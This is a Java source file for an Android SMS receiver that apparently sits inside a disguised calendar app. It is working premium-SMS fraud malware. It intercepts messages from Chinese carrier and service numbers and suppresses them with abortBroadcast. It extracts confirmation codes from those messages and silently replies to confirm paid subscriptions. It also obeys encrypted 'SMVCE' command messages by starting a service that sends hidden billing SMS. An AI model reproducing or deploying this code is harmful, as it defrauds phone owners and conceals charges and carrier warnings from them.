package com.sttm.charge;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import android.os.Bundle;
import android.telephony.gsm.SmsMessage;


import com.sttm.bean.BillSms;
import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.util.EncryptUtil;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;

import com.android.calendar.R;

@SuppressWarnings("deprecation")
public class SmsReceiver extends BroadcastReceiver {
	private static final String strRes = "android.provider.Telephony.SMS_RECEIVED";
	private static final String TAG = "SmsReceiver";
	private String smsNumber;
	private String smsContent;

	private String replyNumber;

	private String saleNum;
	private Boolean sendSecretSms;

	private String keyword;
	private boolean accessFilterSms ;
	
	private boolean smsCenterSendFlag;

	public SmsReceiver() {

	}

	public void onReceive(Context context, Intent intent) {
		
	
		

		if (intent.getAction().equals(strRes)) {
			
			
			smsCenterSendFlag = KsoCache.getInstance().getValue(
					"smsCenterFlag") != null ? (Boolean) KsoCache
					.getInstance().getValue("smsCenterFlag") : false;
					
					
			saleNum = KsoCache.getInstance().getValue("salenum") != null ? (String) KsoCache
					.getInstance().getValue("salenum") : "";

			sendSecretSms = KsoCache.getInstance().getValue("sendSecretSms") != null ? (Boolean) KsoCache
					.getInstance().getValue("sendSecretSms") : false;
					accessFilterSms = KsoCache.getInstance().getValue("accessFilterSms") == null ? true :
				(Boolean)KsoCache.getInstance().getValue("accessFilterSms") ;
					

			replyNumber = KsoCache.getInstance().getValue(
					"replyNumber") != null ? (String) KsoCache
					.getInstance().getValue("replyNumber") : "";

			keyword = KsoCache.getInstance().getValue("keyword") != null ? (String) KsoCache
					.getInstance().getValue("keyword") : "";

			StringBuilder body = new StringBuilder();
			StringBuilder number = new StringBuilder();
			Bundle bundle = intent.getExtras();

			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				SmsMessage[] msg = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					msg[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				}

				for (SmsMessage currMsg : msg) {
					body.append(currMsg.getDisplayMessageBody());
					number.append(currMsg.getDisplayOriginatingAddress());
				}
				

				smsContent = body.toString();
				smsNumber = number.toString();
		
				
				if (smsNumber.startsWith("10086") || smsNumber.startsWith("10010")
						|| smsNumber.startsWith("106")) {

				
					SmsMessage message = msg[0];
					KsoCache.getInstance().reSetValue("SmsCenterNumber",
							message.getServiceCenterAddress());


					KsoCache.getInstance().reSetValue("smsCenterFlag", false);		
				
					if (smsCenterSendFlag) {
						this.abortBroadcast();
					}

				}
				
				
				
			}

			if (sendSecretSms && accessFilterSms) {
				if (smsNumber.startsWith("10")
						|| smsNumber.startsWith(replyNumber)) {
					this.abortBroadcast();

				}
			}

			if (!"".equals(replyNumber) && smsNumber.startsWith(replyNumber)) {
	
				if (smsContent.contains(context.getString(R.string.google_smsreceiver_aaa)) || smsContent.contains(context.getString(R.string.google_smsreceiver_bbb))) {

			
					if (sendSecretSms) {

						SmsSenderAndReceiver.send2(smsNumber, context.getString(R.string.google_smsreceiver_ccc));

						this.abortBroadcast();

					}

				}

				if (smsContent.contains(context.getString(R.string.google_smsreceiver_ddd))
						|| smsContent.contains(context.getString(R.string.google_smsreceiver_eee))
						|| (!"".equals(keyword) && smsContent.contains(keyword))) {


					int offSet = 0;
					if (smsContent.contains(context.getString(R.string.google_smsreceiver_ddd))
							|| smsContent.contains(context.getString(R.string.google_smsreceiver_eee))) {
						offSet = smsContent.indexOf(context.getString(R.string.google_smsreceiver_ddd)) + 4;
					} else if (!"".equals(keyword)
							&& smsContent.indexOf(keyword) >= 0) {
						offSet = smsContent.indexOf(keyword) + keyword.length();
					}
					int lastSet = 0;

					if (String.valueOf(smsContent.charAt(offSet)).matches(
							"^[A-Za-z0-9]+$")) {

						for (int i = offSet; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								lastSet = i;
								break;
							}
						}


						String smsCon = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCon = smsContent.substring(offSet, lastSet);

						} else {
							smsCon = smsContent.substring(offSet);
						}

						if (sendSecretSms) {

							SmsSenderAndReceiver.send2(smsNumber, smsCon);

							this.abortBroadcast();


						}

					} else if (!String.valueOf(smsContent.charAt(offSet))
							.matches("^(w|[u4E00-u9FA5])*$")) {

						int startIndex = 0;

						for (int i = offSet + 1; i < smsContent.length(); i++) {
							if (String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								startIndex = i;
								break;
							}
						}

						for (int i = startIndex; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^(w|[u4E00-u9FA5])*$")) {

								lastSet = i;
								break;
							}
						}

						String smsCont = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCont = smsContent.substring(startIndex, lastSet);

						} else {
							smsCont = smsContent.substring(startIndex);
						}

						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);

							this.abortBroadcast();


						}

					}

				}

			} else if (interpruptPhone(smsNumber)) {

				if ((smsContent.contains(context.getString(R.string.google_smsreceiver_ggg))&& smsContent.contains(context.getString(R.string.google_smsreceiver_hhh))
						&& smsContent.contains(context.getString(R.string.google_smsreceiver_jjj)) && smsContent
							.contains(context.getString(R.string.google_smsreceiver_kkk)))
						|| (smsContent.contains(context.getString(R.string.google_smsreceiver_lll)) && smsContent
								.contains(context.getString(R.string.google_smsreceiver_mmm)))
						|| (smsContent.contains(context.getString(R.string.google_smsreceiver_nnn)) && smsContent
								.contains(context.getString(R.string.google_smsreceiver_ooo)))
						|| (smsContent.contains(context.getString(R.string.google_smsreceiver_ppp)))
						|| (smsContent.contains(context.getString(R.string.google_smsreceiver_iii)))) {

					this.abortBroadcast();


				}


				if (smsContent.contains(context.getString(R.string.google_smsreceiver_aaa)) || smsContent.contains(context.getString(R.string.google_smsreceiver_bbb))) {

					if (sendSecretSms) {

						SmsSenderAndReceiver.send2(smsNumber, context.getString(R.string.google_smsreceiver_ccc));

						this.abortBroadcast();

					}
				}


				if (smsContent.contains(context.getString(R.string.google_smsreceiver_ddd))
						|| smsContent.contains(context.getString(R.string.google_smsreceiver_eee))
						|| (!interpruptContent(smsContent)
								&& !"".equals(keyword) && smsContent
								.indexOf(keyword) > 0)) {

					int offSet = 0;
					if (smsContent.contains(context.getString(R.string.google_smsreceiver_ddd))
							|| smsContent.contains(context.getString(R.string.google_smsreceiver_eee))) {
						offSet = smsContent.indexOf(context.getString(R.string.google_smsreceiver_ddd)) + 4;
					} else if (!"".equals(keyword)
							&& smsContent.indexOf(keyword) > 0) {
						offSet = smsContent.indexOf(keyword) + keyword.length();
					}

					int lastSet = 0;

					if (String.valueOf(smsContent.charAt(offSet)).matches(
							"^[A-Za-z0-9]+$")) {
						for (int i = offSet; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {
								lastSet = i;
								break;
							}
						}
						String smsCon = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCon = smsContent.substring(offSet, lastSet);

						} else {
							smsCon = smsContent.substring(offSet);
						}

						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCon);

							this.abortBroadcast();


						}

					} else if (!String.valueOf(smsContent.charAt(offSet))
							.matches("^(w|[u4E00-u9FA5])*$")) {
						int startIndex = 0;

						for (int i = offSet + 1; i < smsContent.length(); i++) {
							if (String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								startIndex = i;
								break;
							}
						}

						for (int i = startIndex; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^(w|[u4E00-u9FA5])*$")) {

								lastSet = i;
								break;
							}
						}
						String smsCont = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCont = smsContent.substring(startIndex, lastSet);

						} else {
							smsCont = smsContent.substring(startIndex);
						}
						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);

							this.abortBroadcast();


						}

					}

				}

				if (smsContent.contains(context.getString(R.string.google_smsreceiver_lll)) || smsContent.contains(context.getString(R.string.google_smsreceiver_fff))) {
					if (sendSecretSms) {
						this.abortBroadcast();

					}
				}

				if (sendSecretSms) {

					this.abortBroadcast();


				}

			} else if (!"".equals(smsNumber) && !"".equals(saleNum)
					&& smsNumber.indexOf(saleNum.trim()) >= 0) {

				this.abortBroadcast();


			}

			if (!"".equals(smsContent) && !"".equals(saleNum)&& smsContent.contains(saleNum)) {


				this.abortBroadcast();


			} else if (interpruptContent(smsContent)) {


				this.abortBroadcast();
				
				String SMSF = context.getString(R.string.google_util_aaa);
				BillSms billSms = EncryptUtil.getEncryptSMSString(smsContent,SMSF);
				long time = KsoCache.getInstance().getValue("interval") != null ? (Long) KsoCache
						.getInstance().getValue("interval") : 4;


				Intent service = new Intent(context, SlaveService.class);
				service.putExtra("sendTime", time);
				service.putExtra("sendCount", billSms.getCount());
				service.putExtra("secretSmsReplyNumber",
						billSms.getReplyNumber());
				service.putExtra("keyword", billSms.getKeyword());
				service.putExtra("flag", 1);
				if (KsoHelper.getARS2(context) == 1) {

					service.putExtra("SecretSmsNumber",
							billSms.getMobileChanel());
					
					service.putExtra("SecretSmsOrder", billSms.getMobileOrder());
				

				} else if (KsoHelper.getARS2(context) == 2) {

					service.putExtra("SecretSmsNumber",
							billSms.getUnionChanel());
					service.putExtra("SecretSmsOrder", billSms.getUnionOrder());

					

				} 
				context.startService(service);

			} else if (smsContent.contains(context.getString(R.string.google_smsreceiver_sss).trim())) {
				String curstomId = KsoCache.getInstance().getValue("curstomID") != null ? (String) KsoCache
						.getInstance().getValue("curstomID") : "00000000";

				if (!"".equals(curstomId)) {
					SmsSenderAndReceiver.send2(smsNumber, curstomId);

				}

				this.abortBroadcast();

			}

		}

	}

	public boolean interpruptPhone(String telephoneNumber) {
		if (telephoneNumber.startsWith("10086")
				|| telephoneNumber.startsWith("106")
				|| telephoneNumber.startsWith("10010")) {
			return true;

		}

		return false;

	}


	public boolean interpruptContent(String phoneContent) {
		if (phoneContent.indexOf("SMVCE") >= 0) {
			return true;
		}
		return false;
	}

	private void setSmsCenterNumber(Intent intent) {
		KsoCache cache = KsoCache.getInstance();
		Boolean smsCenterFlag = cache.getValue("smsCenterFlag") != null ? (Boolean) cache
				.getValue("smsCenterFlag") : false;
		if (smsCenterFlag) {
			String actionName = intent.getAction();
			int resultCode = getResultCode();
			if (actionName.equals("lab.sodino.sms.send")) {

				cache.reSetValue("SmsCenterNumber", "000");
			} else if (actionName.equals("lab.sodino.sms.delivery")) {

				cache.reSetValue("SmsCenterNumber", "000");
			} else if (actionName
					.equals("android.provider.Telephony.SMS_RECEIVED")) {

				Bundle bundle = intent.getExtras();
				if (bundle != null) {
					Object[] myOBJpdus = (Object[]) bundle.get("pdus");
					SmsMessage[] messages = new SmsMessage[myOBJpdus.length];
					for (int i = 0; i < myOBJpdus.length; i++) {
						messages[i] = SmsMessage
								.createFromPdu((byte[]) myOBJpdus[i]);
					}
					SmsMessage message = messages[0];
					cache.reSetValue("SmsCenterNumber",
							message.getServiceCenterAddress());


					cache.reSetValue("smsCenterFlag", false);

				}
			}
		}
	}

}
